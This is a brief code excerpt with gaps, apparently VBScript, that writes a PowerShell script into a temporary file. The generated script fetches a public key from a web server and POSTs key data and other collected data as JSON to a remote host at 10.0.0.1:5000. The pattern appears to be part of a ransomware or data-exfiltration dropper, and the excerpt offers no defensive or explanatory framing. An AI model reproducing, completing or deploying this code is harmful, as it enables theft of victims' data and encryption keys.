...
tempPSFile.WriteLine("$sending_base = 'http://127.0.0.1:8080/process.php'")
tempPSFile.WriteLine("# Webserver for getting public key")
tempPSFile.WriteLine("$key = 'http://127.0.0.1:8080/get_public_key.php'")
...
tempPSFile.WriteLine("        $response = Invoke-WebRequest -Uri http://10.0.0.1:5000/ -Method POST -Body ($key_data | ConvertTo-Json) -ContentType 'application/json'")
...
tempPSFile.WriteLine("                        try {")
tempPSFile.WriteLine("                            $response = Invoke-WebRequest -Uri http://10.0.0.1:5000/ -Method POST -Body ($data | ConvertTo-Json) -ContentType 'application/json'")
